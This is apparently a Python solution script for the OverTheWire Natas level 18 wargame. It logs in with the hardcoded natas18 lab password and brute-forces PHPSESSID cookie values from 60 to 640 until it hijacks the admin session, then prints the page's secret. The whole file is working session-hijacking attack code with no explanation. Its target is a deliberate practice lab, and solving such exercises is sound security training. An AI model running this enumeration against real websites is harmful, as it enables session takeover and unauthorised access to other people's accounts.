import sys

import requests
from bs4 import BeautifulSoup

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
msg = 'You are an admin'
url = "http://{}.natas.labs.overthewire.org/".format(username)
session = requests.Session()
for i in range(60, 641):
    cookie = {'PHPSESSID': str(i)}
    r = session.get(url, cookies=cookie, auth=(username, password))
    if msg in r.text:
        print("\nFound admin Session ID: " + str(i))
        sp = BeautifulSoup(r.text, 'lxml')
        pre = sp.find_all('pre')
        print(pre[0].text)
        break
    else:
        sys.stdout.write("\rTrying: " + str(i))
        sys.stdout.flush()
